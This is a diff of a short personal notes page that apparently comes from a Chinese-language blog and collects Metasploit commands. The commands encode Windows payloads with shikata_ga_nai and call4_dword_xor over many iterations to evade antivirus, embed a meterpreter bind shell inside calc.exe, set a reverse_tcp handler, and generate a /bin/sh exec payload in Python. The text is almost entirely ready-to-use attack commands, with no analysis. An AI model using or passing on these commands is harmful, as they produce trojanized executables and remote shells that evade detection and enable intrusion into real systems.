@@ -5,6 +5,7 @@ categories:
 tags: [笔记]
 photos:
 ---
+/usr/share/metasploit-framework/tools
 cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
 PAYLOAD windows/meterpreter/reverse_tcp
@@ -15,7 +16,14 @@ $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/nu
 $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
  
  github/metasploitavevasion
-<!--more-->                                                                                                                          
+<!--more-->         
+msfconsole
+show payload   
+use linux/x64/exec
+set cmd /bin/sh
+generate -t py -b "/x00"
+
+
     echo ""
     echo 'use exploit/multi/handler' >> msfhandler.rc
     echo "set payload $PAYLOAD" >> msfhandler.rc
